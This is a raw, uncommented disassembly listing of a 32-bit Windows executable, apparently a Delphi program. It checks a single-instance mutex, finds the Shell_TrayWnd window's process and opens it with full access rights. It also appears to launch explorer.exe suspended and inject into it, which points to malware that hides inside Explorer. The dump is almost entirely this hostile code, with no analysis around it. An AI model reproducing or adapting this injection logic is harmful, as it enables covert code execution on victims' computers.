  40916f:	e8 44 cf ff ff       	call   0x4060b8
  409174:	33 c0                	xor    %eax,%eax
  409176:	e8 b5 f7 ff ff       	call   0x408930
  40917b:	6a 00                	push   $0x0
  40917d:	e8 2e ba ff ff       	call   0x404bb0
  409182:	33 c0                	xor    %eax,%eax
  409184:	5a                   	pop    %edx
  409185:	59                   	pop    %ecx
  409186:	59                   	pop    %ecx
  409187:	64 89 10             	mov    %edx,%fs:(%eax)
  40918a:	68 a4 91 40 00       	push   $0x4091a4
  40918f:	8d 45 90             	lea    -0x70(%ebp),%eax
  409192:	ba 05 00 00 00       	mov    $0x5,%edx
  409197:	e8 d8 a5 ff ff       	call   0x403774
  40919c:	c3                   	ret
  40919d:	e9 22 a0 ff ff       	jmp    0x4031c4
  4091a2:	eb eb                	jmp    0x40918f
  4091a4:	5e                   	pop    %esi
  4091a5:	5b                   	pop    %ebx
  4091a6:	8b e5                	mov    %ebp,%esp
  4091a8:	5d                   	pop    %ebp
  4091a9:	c3                   	ret
  4091aa:	00 00                	add    %al,(%eax)
  4091ac:	ff                   	(bad)
  4091ad:	ff                   	(bad)
  4091ae:	ff                   	(bad)
  4091af:	ff 0c 00             	decl   (%eax,%eax,1)
  4091b2:	00 00                	add    %al,(%eax)
  4091b4:	65 78 70             	gs js  0x409227
  4091b7:	6c                   	insb   (%dx),%es:(%edi)
  4091b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4091b9:	72 65                	jb     0x409220
  4091bb:	72 2e                	jb     0x4091eb
  4091bd:	65 78 65             	gs js  0x409225
  4091c0:	00 00                	add    %al,(%eax)
  4091c2:	00 00                	add    %al,(%eax)
  4091c4:	65 78 70             	gs js  0x409237
  4091c7:	6c                   	insb   (%dx),%es:(%edi)
  4091c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4091c9:	72 65                	jb     0x409230
  4091cb:	72 2e                	jb     0x4091fb
  4091cd:	65 78 65             	gs js  0x409235
  4091d0:	00 00                	add    %al,(%eax)
  4091d2:	00 00                	add    %al,(%eax)
  4091d4:	73 68                	jae    0x40923e
  4091d6:	65 6c                	gs insb (%dx),%es:(%edi)
  4091d8:	6c                   	insb   (%dx),%es:(%edi)
  4091d9:	5f                   	pop    %edi
  4091da:	74 72                	je     0x40924e
  4091dc:	61                   	popa
  4091dd:	79 77                	jns    0x409256
  4091df:	6e                   	outsb  %ds:(%esi),(%dx)
  4091e0:	64 00 00             	add    %al,%fs:(%eax)
  4091e3:	00 00                	add    %al,(%eax)
  4091e5:	00 00                	add    %al,(%eax)
  4091e7:	00 6f 70             	add    %ch,0x70(%edi)
  4091ea:	65 6e                	outsb  %gs:(%esi),(%dx)
  4091ec:	00 00                	add    %al,(%eax)
  4091ee:	00 00                	add    %al,(%eax)
  4091f0:	55                   	push   %ebp
  4091f1:	8b ec                	mov    %esp,%ebp
  4091f3:	83 c4 9c             	add    $0xffffff9c,%esp
  4091f6:	53                   	push   %ebx
  4091f7:	56                   	push   %esi
  4091f8:	33 c0                	xor    %eax,%eax
  4091fa:	89 45 a4             	mov    %eax,-0x5c(%ebp)
  4091fd:	89 45 a0             	mov    %eax,-0x60(%ebp)
  409200:	89 45 9c             	mov    %eax,-0x64(%ebp)
  409203:	33 c0                	xor    %eax,%eax
  409205:	55                   	push   %ebp
  409206:	68 11 93 40 00       	push   $0x409311
  40920b:	64 ff 30             	push   %fs:(%eax)
  40920e:	64 89 20             	mov    %esp,%fs:(%eax)
  409211:	8d 45 9c             	lea    -0x64(%ebp),%eax
  409214:	e8 13 de ff ff       	call   0x40702c
  409219:	8b 45 9c             	mov    -0x64(%ebp),%eax
  40921c:	e8 a3 a8 ff ff       	call   0x403ac4
  409221:	8b d0                	mov    %eax,%edx
  409223:	8d 45 a0             	lea    -0x60(%ebp),%eax
  409226:	e8 45 a6 ff ff       	call   0x403870
  40922b:	8b 4d a0             	mov    -0x60(%ebp),%ecx
  40922e:	8b 15 08 a1 40 00    	mov    0x40a108,%edx
  409234:	8b 12                	mov    (%edx),%edx
  409236:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  409239:	e8 d2 a6 ff ff       	call   0x403910
  40923e:	8b 45 a4             	mov    -0x5c(%ebp),%eax
  409241:	e8 7e a8 ff ff       	call   0x403ac4
  409246:	50                   	push   %eax
  409247:	6a 00                	push   $0x0
  409249:	6a 00                	push   $0x0
  40924b:	e8 28 b9 ff ff       	call   0x404b78
  409250:	8b d8                	mov    %eax,%ebx
  409252:	e8 91 b9 ff ff       	call   0x404be8
  409257:	3d b7 00 00 00       	cmp    $0xb7,%eax
  40925c:	75 0b                	jne    0x409269
  40925e:	53                   	push   %ebx
  40925f:	e8 e4 b8 ff ff       	call   0x404b48
  409264:	e9 8d 00 00 00       	jmp    0x4092f6
  409269:	53                   	push   %ebx
  40926a:	e8 d9 b8 ff ff       	call   0x404b48
  40926f:	a1 d0 a0 40 00       	mov    0x40a0d0,%eax
  409274:	e8 a3 a8 ff ff       	call   0x403b1c
  409279:	8b f0                	mov    %eax,%esi
  40927b:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40927e:	50                   	push   %eax
  40927f:	6a 00                	push   $0x0
  409281:	68 20 93 40 00       	push   $0x409320
  409286:	e8 15 ba ff ff       	call   0x404ca0
  40928b:	50                   	push   %eax
  40928c:	e8 17 ba ff ff       	call   0x404ca8
  409291:	8b 45 fc             	mov    -0x4(%ebp),%eax
  409294:	50                   	push   %eax
  409295:	6a 00                	push   $0x0
  409297:	68 ff 0f 1f 00       	push   $0x1f0fff
  40929c:	e8 7f b9 ff ff       	call   0x404c20
  4092a1:	8b d8                	mov    %eax,%ebx
  4092a3:	8b d6                	mov    %esi,%edx
  4092a5:	8b c3                	mov    %ebx,%eax
  4092a7:	e8 b8 c3 ff ff       	call   0x405664
  4092ac:	84 c0                	test   %al,%al
  4092ae:	75 46                	jne    0x4092f6
  4092b0:	8d 45 a8             	lea    -0x58(%ebp),%eax
  4092b3:	ba 44 00 00 00       	mov    $0x44,%edx
  4092b8:	e8 fb b9 ff ff       	call   0x404cb8
  4092bd:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4092c0:	ba 10 00 00 00       	mov    $0x10,%edx
  4092c5:	e8 ee b9 ff ff       	call   0x404cb8
  4092ca:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4092cd:	50                   	push   %eax
  4092ce:	8d 45 a8             	lea    -0x58(%ebp),%eax
  4092d1:	50                   	push   %eax
  4092d2:	6a 00                	push   $0x0
  4092d4:	6a 00                	push   $0x0
  4092d6:	6a 04                	push   $0x4
  4092d8:	6a 00                	push   $0x0
  4092da:	6a 00                	push   $0x0
  4092dc:	6a 00                	push   $0x0
  4092de:	68 30 93 40 00       	push   $0x409330
  4092e3:	6a 00                	push   $0x0
  4092e5:	e8 ae b8 ff ff       	call   0x404b98
  4092ea:	8b 5d ec             	mov    -0x14(%ebp),%ebx
  4092ed:	8b d6                	mov    %esi,%edx
  4092ef:	8b c3                	mov    %ebx,%eax
  4092f1:	e8 6e c3 ff ff       	call   0x405664
  4092f6:	33 c0                	xor    %eax,%eax
  4092f8:	5a                   	pop    %edx
  4092f9:	59                   	pop    %ecx
  4092fa:	59                   	pop    %ecx
  4092fb:	64 89 10             	mov    %edx,%fs:(%eax)
  4092fe:	68 18 93 40 00       	push   $0x409318
  409303:	8d 45 9c             	lea    -0x64(%ebp),%eax
  409306:	ba 03 00 00 00       	mov    $0x3,%edx
  40930b:	e8 64 a4 ff ff       	call   0x403774
  409310:	c3                   	ret
  409311:	e9 ae 9e ff ff       	jmp    0x4031c4
  409316:	eb eb                	jmp    0x409303
  409318:	5e                   	pop    %esi
  409319:	5b                   	pop    %ebx
  40931a:	8b e5                	mov    %ebp,%esp
  40931c:	5d                   	pop    %ebp
  40931d:	c3                   	ret
  40931e:	00 00                	add    %al,(%eax)
  409320:	53                   	push   %ebx
  409321:	68 65 6c 6c 5f       	push   $0x5f6c6c65
  409326:	54                   	push   %esp
  409327:	72 61                	jb     0x40938a
  409329:	79 57                	jns    0x409382
  40932b:	6e                   	outsb  %ds:(%esi),(%dx)
  40932c:	64 00 00             	add    %al,%fs:(%eax)
  40932f:	00 65 78             	add    %ah,0x78(%ebp)
  409332:	70 6c                	jo     0x4093a0
  409334:	6f                   	outsl  %ds:(%esi),(%dx)
  409335:	72 65                	jb     0x40939c
  409337:	72 2e                	jb     0x409367
  409339:	65 78 65             	gs js  0x4093a1
  40933c:	00 00                	add    %al,(%eax)
  40933e:	00 00                	add    %al,(%eax)
  409340:	55                   	push   %ebp
  409341:	8b ec                	mov    %esp,%ebp
  409343:	33 c9                	xor    %ecx,%ecx
  409345:	51                   	push   %ecx
  409346:	51                   	push   %ecx
  409347:	51                   	push   %ecx
  409348:	51                   	push   %ecx
  409349:	51                   	push   %ecx
  40934a:	53                   	push   %ebx
  40934b:	56                   	push   %esi
  40934c:	89 55 f8             	mov    %edx,-0x8(%ebp)
  40934f:	89 45 fc             	mov    %eax,-0x4(%ebp)
  409352:	8b 45 fc             	mov    -0x4(%ebp),%eax
  409355:	e8 5a a7 ff ff       	call   0x403ab4
  40935a:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40935d:	e8 52 a7 ff ff       	call   0x403ab4
  409362:	33 c0                	xor    %eax,%eax
  409364:	55                   	push   %ebp
  409365:	68 4e 94 40 00       	push   $0x40944e
  40936a:	64 ff 30             	push   %fs:(%eax)
  40936d:	64 89 20             	mov    %esp,%fs:(%eax)
  409370:	8d 55 f0             	lea    -0x10(%ebp),%edx
  409373:	33 c0                	xor    %eax,%eax
  409375:	e8 6a 97 ff ff       	call   0x402ae4
  40937a:	8b 55 f0             	mov    -0x10(%ebp),%edx
  40937d:	8d 45 f4             	lea    -0xc(%ebp),%eax
  409380:	b9 64 94 40 00       	mov    $0x409464,%ecx
  409385:	e8 86 a5 ff ff       	call   0x403910
  40938a:	ff 75 f4             	push   -0xc(%ebp)
  40938d:	ff 75 fc             	push   -0x4(%ebp)
  409390:	68 64 94 40 00       	push   $0x409464
  409395:	8d 45 f4             	lea    -0xc(%ebp),%eax
  409398:	ba 03 00 00 00       	mov    $0x3,%edx
  40939d:	e8 e2 a5 ff ff       	call   0x403984
  4093a2:	be 65 00 00 00       	mov    $0x65,%esi
  4093a7:	8b 1d c8 a0 40 00    	mov    0x40a0c8,%ebx
  4093ad:	83 3b 00             	cmpl   $0x0,(%ebx)
  4093b0:	74 32                	je     0x4093e4
  4093b2:	8b 03                	mov    (%ebx),%eax
  4093b4:	ba 70 94 40 00       	mov    $0x409470,%edx
  4093b9:	e8 52 a6 ff ff       	call   0x403a10
  4093be:	74 24                	je     0x4093e4
  4093c0:	ff 75 f4             	push   -0xc(%ebp)
  4093c3:	8d 55 ec             	lea    -0x14(%ebp),%edx
  4093c6:	8b 03                	mov    (%ebx),%eax
  4093c8:	e8 7f c4 ff ff       	call   0x40584c
  4093cd:	ff 75 ec             	push   -0x14(%ebp)
  4093d0:	68 7c 94 40 00       	push   $0x40947c
  4093d5:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4093d8:	ba 03 00 00 00       	mov    $0x3,%edx
  4093dd:	e8 a2 a5 ff ff       	call   0x403984
  4093e2:	eb 1a                	jmp    0x4093fe
  4093e4:	ff 75 f4             	push   -0xc(%ebp)
  4093e7:	68 70 94 40 00       	push   $0x409470
  4093ec:	68 7c 94 40 00       	push   $0x40947c
  4093f1:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4093f4:	ba 03 00 00 00       	mov    $0x3,%edx
  4093f9:	e8 86 a5 ff ff       	call   0x403984
  4093fe:	83 c3 04             	add    $0x4,%ebx
  409401:	4e                   	dec    %esi
  409402:	75 a9                	jne    0x4093ad
  409404:	ff 75 f4             	push   -0xc(%ebp)
  409407:	68 70 94 40 00       	push   $0x409470
  40940c:	68 7c 94 40 00       	push   $0x40947c
  409411:	8d 45 f4             	lea    -0xc(%ebp),%eax
  409414:	ba 03 00 00 00       	mov    $0x3,%edx
  409419:	e8 66 a5 ff ff       	call   0x403984
  40941e:	8b 45 f4             	mov    -0xc(%ebp),%eax
  409421:	e8 9e a4 ff ff       	call   0x4038c4
  409426:	8b c8                	mov    %eax,%ecx
  409428:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40942b:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40942e:	e8 7d cf ff ff       	call   0x4063b0
  409433:	33 c0                	xor    %eax,%eax
  409435:	5a                   	pop    %edx
  409436:	59                   	pop    %ecx
  409437:	59                   	pop    %ecx
  409438:	64 89 10             	mov    %edx,%fs:(%eax)
  40943b:	68 55 94 40 00       	push   $0x409455
  409440:	8d 45 ec             	lea    -0x14(%ebp),%eax
  409443:	ba 05 00 00 00       	mov    $0x5,%edx
  409448:	e8 27 a3 ff ff       	call   0x403774
  40944d:	c3                   	ret
  40944e:	e9 71 9d ff ff       	jmp    0x4031c4
  409453:	eb eb                	jmp    0x409440
  409455:	5e                   	pop    %esi
  409456:	5b                   	pop    %ebx
  409457:	8b e5                	mov    %ebp,%esp
  409459:	5d                   	pop    %ebp
  40945a:	c3                   	ret
  40945b:	00 ff                	add    %bh,%bh
  40945d:	ff                   	(bad)
  40945e:	ff                   	(bad)
  40945f:	ff 01                	incl   (%ecx)
  409461:	00 00                	add    %al,(%eax)
  409463:	00 7c 00 00          	add    %bh,0x0(%eax,%eax,1)
  409467:	00 ff                	add    %bh,%bh
  409469:	ff                   	(bad)
  40946a:	ff                   	(bad)
  40946b:	ff 01                	incl   (%ecx)
  40946d:	00 00                	add    %al,(%eax)
  40946f:	00 20                	add    %ah,(%eax)
  409471:	00 00                	add    %al,(%eax)
  409473:	00 ff                	add    %bh,%bh
  409475:	ff                   	(bad)
  409476:	ff                   	(bad)
  409477:	ff 09                	decl   (%ecx)
  409479:	00 00                	add    %al,(%eax)
  40947b:	00 23                	add    %ah,(%ebx)
  40947d:	23 23                	and    (%ebx),%esp
  40947f:	23 40 23             	and    0x23(%eax),%eax
  409482:	23 23                	and    (%ebx),%esp
  409484:	23 00                	and    (%eax),%eax
  409486:	00 00                	add    %al,(%eax)
  409488:	55                   	push   %ebp
  409489:	8b ec                	mov    %esp,%ebp
  40948b:	33 c0                	xor    %eax,%eax
  40948d:	55                   	push   %ebp
  40948e:	68 b1 94 40 00       	push   $0x4094b1
  409493:	64 ff 30             	push   %fs:(%eax)
  409496:	64 89 20             	mov    %esp,%fs:(%eax)
  409499:	b8 84 b9 40 00       	mov    $0x40b984,%eax
  40949e:	e8 ad a2 ff ff       	call   0x403750
  4094a3:	33 c0                	xor    %eax,%eax
  4094a5:	5a                   	pop    %edx
  4094a6:	59                   	pop    %ecx
  4094a7:	59                   	pop    %ecx
  4094a8:	64 89 10             	mov    %edx,%fs:(%eax)
  4094ab:	68 b8 94 40 00       	push   $0x4094b8
  4094b0:	c3                   	ret
  4094b1:	e9 0e 9d ff ff       	jmp    0x4031c4
  4094b6:	eb f8                	jmp    0x4094b0
  4094b8:	5d                   	pop    %ebp
  4094b9:	c3                   	ret
  4094ba:	8b c0                	mov    %eax,%eax
  4094bc:	15 00 00 00 c4       	adc    $0xc4000000,%eax
  4094c1:	94                   	xchg   %eax,%esp
  4094c2:	40                   	inc    %eax
  4094c3:	00 c8                	add    %cl,%al
  4094c5:	4a                   	dec    %edx
  4094c6:	40                   	inc    %eax
  4094c7:	00 98 4a 40 00 bc    	add    %bl,-0x43ffbfb6(%eax)
  4094cd:	48                   	dec    %eax
  4094ce:	40                   	inc    %eax
  4094cf:	00 68 48             	add    %ch,0x48(%eax)
  4094d2:	40                   	inc    %eax
  4094d3:	00 00                	add    %al,(%eax)
  4094d5:	4b                   	dec    %ebx
  4094d6:	40                   	inc    %eax
  4094d7:	00 d0                	add    %dl,%al
  4094d9:	4a                   	dec    %edx
  4094da:	40                   	inc    %eax
  4094db:	00 f0                	add    %dh,%al
  4094dd:	4c                   	dec    %esp
  4094de:	40                   	inc    %eax
  4094df:	00 c0                	add    %al,%al
  4094e1:	4c                   	dec    %esp
  4094e2:	40                   	inc    %eax
  4094e3:	00 b8 57 40 00 88    	add    %bh,-0x77ffbfa9(%eax)
  4094e9:	57                   	push   %edi
  4094ea:	40                   	inc    %eax
  4094eb:	00 6c 5b 40          	add    %ch,0x40(%ebx,%ebx,2)
  4094ef:	00 3c 5b             	add    %bh,(%ebx,%ebx,2)
  4094f2:	40                   	inc    %eax
  4094f3:	00 0c 5c             	add    %cl,(%esp,%ebx,2)
  4094f6:	40                   	inc    %eax
  4094f7:	00 b4 5b 40 00 00 60 	add    %dh,0x60000040(%ebx,%ebx,2)
  4094fe:	40                   	inc    %eax
  4094ff:	00 d0                	add    %dl,%al
  409501:	5f                   	pop    %edi
  409502:	40                   	inc    %eax
  409503:	00 c8                	add    %cl,%al
  409505:	5f                   	pop    %edi
  409506:	40                   	inc    %eax
  409507:	00 98 5f 40 00 20    	add    %bl,0x2000405f(%eax)
  40950d:	6e                   	outsb  %ds:(%esi),(%dx)
  40950e:	40                   	inc    %eax
  40950f:	00 f0                	add    %dh,%al
  409511:	6d                   	insl   (%dx),%es:(%edi)
  409512:	40                   	inc    %eax
  409513:	00 7c 5c 40          	add    %bh,0x40(%esp,%ebx,2)
  409517:	00 4c 5c 40          	add    %cl,0x40(%esp,%ebx,2)
  40951b:	00 b4 5c 40 00 84 5c 	add    %dh,0x5c840040(%esp,%ebx,2)
  409522:	40                   	inc    %eax
  409523:	00 44 5c 40          	add    %al,0x40(%esp,%ebx,2)
  409527:	00 14 5c             	add    %dl,(%esp,%ebx,2)
  40952a:	40                   	inc    %eax
  40952b:	00 90 72 40 00 60    	add    %dl,0x60004072(%eax)
  409531:	72 40                	jb     0x409573
  409533:	00 2c 73             	add    %ch,(%ebx,%esi,2)
  409536:	40                   	inc    %eax
  409537:	00 fc                	add    %bh,%ah
  409539:	72 40                	jb     0x40957b
  40953b:	00 e8                	add    %ch,%al
  40953d:	77 40                	ja     0x40957f
  40953f:	00 70 76             	add    %dh,0x76(%eax)
  409542:	40                   	inc    %eax
  409543:	00 a4 7f 40 00 74 7f 	add    %ah,0x7f740040(%edi,%edi,2)
  40954a:	40                   	inc    %eax
  40954b:	00 10                	add    %dl,(%eax)
  40954d:	83 40 00 d4          	addl   $0xffffffd4,0x0(%eax)
  409551:	82 40 00 f4          	addb   $0xf4,0x0(%eax)
  409555:	88 40 00             	mov    %al,0x0(%eax)
  409558:	c4 88 40 00 fc 8a    	les    -0x7503ffc0(%eax),%ecx
  40955e:	40                   	inc    %eax
  40955f:	00 cc                	add    %cl,%ah
  409561:	8a 40 00             	mov    0x0(%eax),%al
  409564:	00 00                	add    %al,(%eax)
  409566:	00 00                	add    %al,(%eax)
  409568:	88 94 40 00 55 8b ec 	mov    %dl,-0x1374ab00(%eax,%eax,2)
  40956f:	b9 07 00 00 00       	mov    $0x7,%ecx
  409574:	6a 00                	push   $0x0
  409576:	6a 00                	push   $0x0
  409578:	49                   	dec    %ecx
  409579:	75 f9                	jne    0x409574
  40957b:	51                   	push   %ecx
  40957c:	53                   	push   %ebx
  40957d:	b8 bc 94 40 00       	mov    $0x4094bc,%eax
  409582:	e8 cd b4 ff ff       	call   0x404a54
  409587:	33 c0                	xor    %eax,%eax
  409589:	55                   	push   %ebp
  40958a:	68 06 98 40 00       	push   $0x409806
  40958f:	64 ff 30             	push   %fs:(%eax)
  409592:	64 89 20             	mov    %esp,%fs:(%eax)
  409595:	8d 45 ec             	lea    -0x14(%ebp),%eax
  409598:	e8 eb d9 ff ff       	call   0x406f88
  40959d:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4095a0:	e8 1f a5 ff ff       	call   0x403ac4
  4095a5:	50                   	push   %eax
  4095a6:	6a 00                	push   $0x0
  4095a8:	6a 00                	push   $0x0
  4095aa:	e8 c9 b5 ff ff       	call   0x404b78
  4095af:	8b d8                	mov    %eax,%ebx
  4095b1:	e8 32 b6 ff ff       	call   0x404be8
  4095b6:	3d b7 00 00 00       	cmp    $0xb7,%eax
  4095bb:	75 12                	jne    0x4095cf
  4095bd:	53                   	push   %ebx
  4095be:	e8 85 b5 ff ff       	call   0x404b48
  4095c3:	68 e0 2e 00 00       	push   $0x2ee0
  4095c8:	e8 7b b6 ff ff       	call   0x404c48
  4095cd:	eb 06                	jmp    0x4095d5
  4095cf:	53                   	push   %ebx
  4095d0:	e8 73 b5 ff ff       	call   0x404b48
  4095d5:	8d 55 e8             	lea    -0x18(%ebp),%edx
  4095d8:	b8 01 00 00 00       	mov    $0x1,%eax
  4095dd:	e8 02 95 ff ff       	call   0x402ae4
  4095e2:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4095e5:	ba 1c 98 40 00       	mov    $0x40981c,%edx
  4095ea:	e8 21 a4 ff ff       	call   0x403a10
  4095ef:	74 0a                	je     0x4095fb
  4095f1:	68 e8 03 00 00       	push   $0x3e8
  4095f6:	e8 4d b6 ff ff       	call   0x404c48
  4095fb:	e8 74 c5 ff ff       	call   0x405b74
  409600:	e8 2f dd ff ff       	call   0x407334
  409605:	e8 fa f4 ff ff       	call   0x408b04
  40960a:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40960d:	e8 1a cc ff ff       	call   0x40622c
  409612:	8b 45 e0             	mov    -0x20(%ebp),%eax
  409615:	8d 55 e4             	lea    -0x1c(%ebp),%edx
  409618:	e8 0b d8 ff ff       	call   0x406e28
  40961d:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  409620:	8b 0d 10 a1 40 00    	mov    0x40a110,%ecx
  409626:	8b 09                	mov    (%ecx),%ecx
  409628:	b8 88 b9 40 00       	mov    $0x40b988,%eax
  40962d:	e8 de a2 ff ff       	call   0x403910
  409632:	8d 55 d8             	lea    -0x28(%ebp),%edx
  409635:	33 c0                	xor    %eax,%eax
  409637:	e8 a8 94 ff ff       	call   0x402ae4
  40963c:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40963f:	8d 55 dc             	lea    -0x24(%ebp),%edx
  409642:	e8 75 d8 ff ff       	call   0x406ebc
  409647:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40964a:	50                   	push   %eax
  40964b:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  40964e:	a1 88 b9 40 00       	mov    0x40b988,%eax
  409653:	e8 64 d8 ff ff       	call   0x406ebc
  409658:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  40965b:	58                   	pop    %eax
  40965c:	e8 af a3 ff ff       	call   0x403a10
  409661:	75 0a                	jne    0x40966d
  409663:	68 e0 2e 00 00       	push   $0x2ee0
  409668:	e8 db b5 ff ff       	call   0x404c48
  40966d:	a1 08 a1 40 00       	mov    0x40a108,%eax
  409672:	8b 00                	mov    (%eax),%eax
  409674:	e8 4b a4 ff ff       	call   0x403ac4
  409679:	50                   	push   %eax
  40967a:	6a 00                	push   $0x0
  40967c:	6a 00                	push   $0x0
  40967e:	e8 f5 b4 ff ff       	call   0x404b78
  409683:	8b d8                	mov    %eax,%ebx
  409685:	e8 5e b5 ff ff       	call   0x404be8
  40968a:	3d b7 00 00 00       	cmp    $0xb7,%eax
  40968f:	0f 85 c1 00 00 00    	jne    0x409756
  409695:	53                   	push   %ebx
  409696:	e8 ad b4 ff ff       	call   0x404b48
  40969b:	68 e8 03 00 00       	push   $0x3e8
  4096a0:	e8 a3 b5 ff ff       	call   0x404c48
  4096a5:	a1 08 a1 40 00       	mov    0x40a108,%eax
  4096aa:	8b 00                	mov    (%eax),%eax
  4096ac:	e8 13 a4 ff ff       	call   0x403ac4
  4096b1:	50                   	push   %eax
  4096b2:	6a 00                	push   $0x0
  4096b4:	6a 00                	push   $0x0
  4096b6:	e8 bd b4 ff ff       	call   0x404b78
  4096bb:	8b d8                	mov    %eax,%ebx
  4096bd:	e8 26 b5 ff ff       	call   0x404be8
  4096c2:	3d b7 00 00 00       	cmp    $0xb7,%eax
  4096c7:	0f 85 81 00 00 00    	jne    0x40974e
  4096cd:	53                   	push   %ebx
  4096ce:	e8 75 b4 ff ff       	call   0x404b48
  4096d3:	68 e8 03 00 00       	push   $0x3e8
  4096d8:	e8 6b b5 ff ff       	call   0x404c48
  4096dd:	a1 08 a1 40 00       	mov    0x40a108,%eax
  4096e2:	8b 00                	mov    (%eax),%eax
  4096e4:	e8 db a3 ff ff       	call   0x403ac4
  4096e9:	50                   	push   %eax
  4096ea:	6a 00                	push   $0x0
  4096ec:	6a 00                	push   $0x0
  4096ee:	e8 85 b4 ff ff       	call   0x404b78
  4096f3:	8b d8                	mov    %eax,%ebx
  4096f5:	e8 ee b4 ff ff       	call   0x404be8
  4096fa:	3d b7 00 00 00       	cmp    $0xb7,%eax
  4096ff:	75 45                	jne    0x409746
  409701:	53                   	push   %ebx
  409702:	e8 41 b4 ff ff       	call   0x404b48
  409707:	68 e8 03 00 00       	push   $0x3e8
  40970c:	e8 37 b5 ff ff       	call   0x404c48
  409711:	a1 08 a1 40 00       	mov    0x40a108,%eax
  409716:	8b 00                	mov    (%eax),%eax
  409718:	e8 a7 a3 ff ff       	call   0x403ac4
  40971d:	50                   	push   %eax
  40971e:	6a 00                	push   $0x0
  409720:	6a 00                	push   $0x0
  409722:	e8 51 b4 ff ff       	call   0x404b78
  409727:	8b d8                	mov    %eax,%ebx
  409729:	e8 ba b4 ff ff       	call   0x404be8
  40972e:	3d b7 00 00 00       	cmp    $0xb7,%eax
  409733:	75 09                	jne    0x40973e
  409735:	6a 00                	push   $0x0
  409737:	e8 74 b4 ff ff       	call   0x404bb0
  40973c:	eb 1e                	jmp    0x40975c
  40973e:	53                   	push   %ebx
  40973f:	e8 04 b4 ff ff       	call   0x404b48
  409744:	eb 16                	jmp    0x40975c
  409746:	53                   	push   %ebx
  409747:	e8 fc b3 ff ff       	call   0x404b48
  40974c:	eb 0e                	jmp    0x40975c
  40974e:	53                   	push   %ebx
  40974f:	e8 f4 b3 ff ff       	call   0x404b48
  409754:	eb 06                	jmp    0x40975c
  409756:	53                   	push   %ebx
  409757:	e8 ec b3 ff ff       	call   0x404b48
  40975c:	a1 e0 a0 40 00       	mov    0x40a0e0,%eax
  409761:	80 38 01             	cmpb   $0x1,(%eax)
  409764:	75 24                	jne    0x40978a
  409766:	8d 55 cc             	lea    -0x34(%ebp),%edx
  409769:	33 c0                	xor    %eax,%eax
  40976b:	e8 74 93 ff ff       	call   0x402ae4
  409770:	8b 45 cc             	mov    -0x34(%ebp),%eax
  409773:	8d 55 d0             	lea    -0x30(%ebp),%edx
  409776:	e8 9d eb ff ff       	call   0x408318
  40977b:	8b 55 d0             	mov    -0x30(%ebp),%edx
  40977e:	b8 84 b9 40 00       	mov    $0x40b984,%eax
  409783:	e8 1c a0 ff ff       	call   0x4037a4
  409788:	eb 0c                	jmp    0x409796
  40978a:	ba 84 b9 40 00       	mov    $0x40b984,%edx
  40978f:	33 c0                	xor    %eax,%eax
  409791:	e8 4e 93 ff ff       	call   0x402ae4
  409796:	8d 45 c8             	lea    -0x38(%ebp),%eax
  409799:	e8 aa ce ff ff       	call   0x406648
  40979e:	8d 45 c8             	lea    -0x38(%ebp),%eax
  4097a1:	50                   	push   %eax
  4097a2:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  4097a5:	e8 3a d7 ff ff       	call   0x406ee4
  4097aa:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  4097ad:	ba 2c 98 40 00       	mov    $0x40982c,%edx
  4097b2:	e8 15 a1 ff ff       	call   0x4038cc
  4097b7:	8b 55 c4             	mov    -0x3c(%ebp),%edx
  4097ba:	58                   	pop    %eax
  4097bb:	e8 0c a1 ff ff       	call   0x4038cc
  4097c0:	8b 55 c8             	mov    -0x38(%ebp),%edx
  4097c3:	a1 84 b9 40 00       	mov    0x40b984,%eax
  4097c8:	e8 73 fb ff ff       	call   0x409340
  4097cd:	a1 18 a1 40 00       	mov    0x40a118,%eax
  4097d2:	80 38 01             	cmpb   $0x1,(%eax)
  4097d5:	75 0f                	jne    0x4097e6
  4097d7:	e8 14 fa ff ff       	call   0x4091f0
  4097dc:	68 d0 07 00 00       	push   $0x7d0
  4097e1:	e8 62 b4 ff ff       	call   0x404c48
  4097e6:	e8 c1 f5 ff ff       	call   0x408dac
  4097eb:	33 c0                	xor    %eax,%eax
  4097ed:	5a                   	pop    %edx
  4097ee:	59                   	pop    %ecx
  4097ef:	59                   	pop    %ecx
  4097f0:	64 89 10             	mov    %edx,%fs:(%eax)
  4097f3:	68 0d 98 40 00       	push   $0x40980d
  4097f8:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  4097fb:	ba 0b 00 00 00       	mov    $0xb,%edx
  409800:	e8 6f 9f ff ff       	call   0x403774
  409805:	c3                   	ret
  409806:	e9 b9 99 ff ff       	jmp    0x4031c4
  40980b:	eb eb                	jmp    0x4097f8
  40980d:	5b                   	pop    %ebx
  40980e:	e8 45 9e ff ff       	call   0x403658
  409813:	00 ff                	add    %bh,%bh
  409815:	ff                   	(bad)
  409816:	ff                   	(bad)
  409817:	ff 07                	incl   (%edi)
  409819:	00 00                	add    %al,(%eax)
  40981b:	00 52 65             	add    %dl,0x65(%edx)
  40981e:	73 74                	jae    0x409894
  409820:	61                   	popa
  409821:	72 74                	jb     0x409897
  409823:	00 ff                	add    %bh,%bh
  409825:	ff                   	(bad)
  409826:	ff                   	(bad)
  409827:	ff 04 00             	incl   (%eax,%eax,1)
  40982a:	00 00                	add    %al,(%eax)
  40982c:	2e 74 78             	je,pn  0x4098a7
  40982f:	74 00                	je     0x409831
  409831:	00 00                	add    %al,(%eax)
	...
